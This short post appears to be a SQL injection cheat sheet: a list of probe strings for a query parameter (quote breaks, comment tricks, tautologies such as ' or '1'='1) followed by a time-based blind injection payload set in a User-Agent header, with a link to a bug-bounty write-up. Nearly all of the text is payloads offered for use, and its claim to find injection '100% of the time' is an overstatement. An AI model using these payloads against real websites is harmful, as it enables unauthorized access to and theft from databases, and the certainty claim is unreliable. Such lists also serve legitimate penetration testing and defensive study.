```
This is how to find SQL injection 100% of the time, if there is one:/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||' <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='

```


https://medium.com/@pranshux0x/super-blind-sql-injection-20000-bounty-thousands-of-targets-still-vulnerable-f9b013765448
```
Payload: User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR" 
```
